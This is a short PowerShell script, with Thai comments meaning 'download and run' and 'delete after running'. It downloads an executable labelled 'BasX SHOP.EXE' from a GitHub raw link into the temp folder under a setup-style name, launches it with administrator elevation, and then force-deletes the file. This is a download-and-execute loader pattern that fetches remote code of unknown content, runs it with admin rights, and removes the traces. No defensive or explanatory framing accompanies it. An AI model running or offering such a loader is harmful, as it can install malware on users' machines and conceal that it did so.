$url = "https://github.com/relaxhaha56-maker/goku/raw/refs/heads/main/BasX%20SHOP.EXE"
$tempPath = "$env:TEMP\BasX_Setup.exe"

# ดาวน์โหลดและรัน
Invoke-WebRequest -Uri $url -OutFile $tempPath
Start-Process -FilePath $tempPath -Verb RunAs -Wait

# รันเสร็จลบทิ้ง
Remove-Item -Path $tempPath -Force
